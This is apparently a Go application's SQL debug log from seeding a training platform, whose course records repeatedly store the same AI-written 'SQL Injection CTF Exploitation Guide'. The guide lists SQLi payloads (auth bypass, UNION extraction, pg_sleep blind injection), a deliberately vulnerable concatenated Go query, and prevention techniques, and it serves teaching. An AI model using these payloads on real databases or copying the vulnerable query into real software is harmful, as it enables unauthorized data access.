| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,52) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.453ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[7.187ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:54.695','2025-06-09 14:07:54.695',NULL,'cyber security and ommtm','DOQJdsJSLBieiuemYHDPiYABSYgRuLYFCRQjRLtZteCDcofKeoEBYwsesHZBlxehbORRAXZLkqxRlsBasruSmXfYEBxpSJirmkvH',100,2) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.520ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.493ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 53 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[7.805ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:54.703','2025-06-09 14:07:54.703',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,53) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.491ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[6.399ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:54.71','2025-06-09 14:07:54.71',NULL,'cyber security and oduqv','LKksogfJkNRRkxvUTnMiQlBXmomIiDTpXWgePVSOCoMIBHNYDDRDUdDMdJYCPobHgfNRJYOflkKfBdLJZveIPaAWobosOSANDsSy',100,2) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.578ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.533ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 54 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[10.101ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:54.718','2025-06-09 14:07:54.718',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,54) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.468ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[8.219ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:54.727','2025-06-09 14:07:54.727',NULL,'cyber security and slnui','htrcHtaFxWlphXkUeepAXPbMdCMFWyiDMbmNGJRGCGvUUuIEmNWrgYcbAwZUgvjYMeZncWdqMbOWSsFQopuUnZlXWcZjWrXKcmFP',100,2) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.601ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.662ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 55 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[7.714ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:54.736','2025-06-09 14:07:54.736',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,55) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.594ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[15.836ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:54.757','2025-06-09 14:07:54.757',NULL,'cyber security and aqpar','BrUIRSabVNjrZKTwhORNnqCNVOuMwwxdlmiOmIzLPYNAvWhAHwSNEHbIrIeAmsgRkoWANGXaEjrWRbAIfyhdOFgvILHscTJGJWiI',100,2) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.508ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.455ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 56 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[9.789ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:54.765','2025-06-09 14:07:54.765',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,56) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.418ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[6.777ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:54.774','2025-06-09 14:07:54.774',NULL,'cyber security and mejjw','JupTdiScEFUdlMmVUFARyysavvfIobaqjglZrSPLWIbWrpIaAorgQcqDBGAKZriZHgtYMDogyzdABIOSmQeWBbKAcaswPGMIdhwa',100,2) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
